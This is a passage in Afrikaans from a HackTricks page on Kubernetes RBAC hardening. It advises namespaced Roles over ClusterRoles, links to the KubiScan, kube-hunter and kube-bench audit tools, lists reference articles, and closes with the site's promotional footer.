* **Rolle vs. KlusterRolle**: Gee voorkeur aan die gebruik van Rolle en RoleBindings vir naamruimte-spesifieke toestemmings eerder as KlusterRolle en KlusterRoleBindings wat klusterwyd van toepassing is. Hierdie benadering bied fyn beheer en beperk die omvang van toestemmings.

### **Gebruik outomatiese gereedskap**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Verwysings**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
